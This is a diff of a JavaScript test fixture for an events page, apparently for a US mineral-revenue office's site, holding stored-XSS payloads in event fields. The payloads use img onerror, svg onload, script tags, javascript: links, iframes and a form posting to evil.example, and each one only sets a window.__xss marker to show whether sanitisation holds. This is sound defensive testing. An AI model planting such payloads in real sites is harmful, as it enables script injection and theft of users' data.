@@ -124,27 +124,27 @@ export const outreachOnly = {
 }
 
 // CMS content carrying script payloads, as an editor could store by writing to
-// the API directly. Each payload sets window.__xss if it ever runs.
+// the API directly. Every field the page renders as HTML gets one; each payload
+// sets window.__xss if it ever runs.
+const xss = label => `window.__xss = (window.__xss || []).concat('${label}')`
 export const withUnsafeMarkup = {
-  data: {
-    outreach_events: [
-      {
-        ...eventTypename,
-        id: '1',
-        title: 'Indian Minerals Training',
-        description: '<p>Safe description text.</p><img src="x" onerror="window.__xss = \'img onerror\'">',
-        location: '<svg onload="window.__xss = \'svg onload\'"></svg>Tulsa, OK',
-        other_information: '<p onmouseover="window.__xss = \'onmouseover\'">Hover me</p><script>window.__xss = \'script\'</script><iframe src="javascript:window.__xss=\'iframe\'"></iframe>',
-        contact: '<a href="javascript:window.__xss=\'javascript: href\'">John Smith</a>',
-        event_start_date: toDateString(event1Date),
-        event_end_date: toDateString(event1Date),
-        time: '1:00 p.m. - 5:00 p.m. CT',
-        who_should_attend: 'Tribal representatives',
-        // Breaks out of the href attribute that Events.vue builds around the email.
-        email: "x@onrr.gov' onmouseover='window.__xss = \"email attribute\"",
-        is_training: false,
-      },
-    ],
-    other_events: [],
-  },
+  events: [
+    {
+      ...training,
+      description: `<p>Safe training text.</p><img src="x" onerror="${xss('training description')}">`,
+      contact: `<a href="javascript:${xss('training contact')}">Questions</a>: Reporter.Training@onrr.gov`,
+    },
+    {
+      ...outreach1,
+      location: `<svg onload="${xss('svg onload')}"></svg>Oklahoma City, OK 73151`,
+      description: `<p onmouseover="${xss('onmouseover')}">Hover me</p><script>${xss('script')}</script>`,
+      other_information: `<iframe src="javascript:${xss('iframe')}"></iframe><p>More info.</p>`,
+      who_should_attend: `<img src="x" onerror="${xss('who should attend')}">Indian trust mineral owners.`,
+      contact: `<a href="javascript:${xss('outreach contact')}">ONRR OKC Outreach Office</a>`,
+    },
+    {
+      ...other1,
+      description: `<form action="https://evil.example"><input name="p"></form><p>Public comment.</p>`,
+    },
+  ],
 }
